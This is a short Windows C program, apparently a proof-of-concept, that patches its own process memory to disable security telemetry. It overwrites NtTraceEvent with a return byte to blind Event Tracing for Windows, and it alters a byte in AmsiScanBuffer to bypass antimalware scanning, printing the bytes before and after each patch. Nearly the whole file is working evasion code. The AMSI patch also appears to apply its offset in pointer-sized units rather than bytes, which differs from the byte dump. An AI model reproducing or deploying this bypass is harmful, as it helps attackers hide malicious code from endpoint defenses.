#include <windows.h>
#include <amsi.h>
#include <stdio.h>

#pragma comment(lib, "amsi.lib")

int patchEtw() {
	DWORD dwOld = 0;
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtTraceEvent");
	VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrNtTraceEvent, "\xc3", 1);
	VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);

	printf("Etw patched");
	system("pause");

	return 0;
}

int patchAmsi() {

	DWORD dwOld = 0;
	DWORD offset = 0x83;

	FARPROC ptrAmsiScanBuffer = (GetProcAddress(LoadLibrary(L"amsi.dll"), "AmsiScanBuffer"));
	
	VirtualProtect((PVOID*)ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy((PVOID*)ptrAmsiScanBuffer + offset, "\x72", 1);
	VirtualProtect((PVOID*)ptrAmsiScanBuffer + offset, 1, dwOld, &dwOld);
	
	printf("Amsi patched");
	system("pause");

	return 0;
}

int main() {

	LoadLibrary(L"amsi.dll");

	// print pid
	DWORD pid = GetCurrentProcessId();
	printf("PID: %d\n", pid);
	system("pause");


	// print first bytes of AmsiScanBuffer
	FARPROC ptrAmsiScanBuffer = (GetProcAddress(LoadLibrary(L"amsi.dll"), "AmsiScanBuffer"));
	printf("AmsiScanBuffer: %p\n", ptrAmsiScanBuffer);
	for (int i = 0; i < 10; i++) {
		printf("%02x ", ((unsigned char*)ptrAmsiScanBuffer + 0x83)[i]);
	}

	// same for NtTraceEvent
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtTraceEvent");
	printf("\nNtTraceEvent: %p\n", ptrNtTraceEvent);
	for (int i = 0; i < 10; i++) {
		printf("%02x ", ((unsigned char*)ptrNtTraceEvent)[i]);
	}

	patchEtw();	
	patchAmsi();

	
	// print first bytes of AmsiScanBuffer
	ptrAmsiScanBuffer = (GetProcAddress(LoadLibrary(L"amsi.dll"), "AmsiScanBuffer"));
	printf("AmsiScanBuffer: %p\n", ptrAmsiScanBuffer);
	for (int i = 0; i < 10; i++) {
		printf("%02x ", ((unsigned char*)ptrAmsiScanBuffer+0x83)[i]);
	}

	// same for NtTraceEvent
	ptrNtTraceEvent = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtTraceEvent");
	printf("\nNtTraceEvent: %p\n", ptrNtTraceEvent);
	for (int i = 0; i < 10; i++) {
		printf("%02x ", ((unsigned char*)ptrNtTraceEvent)[i]);
	}


	return 0;
}

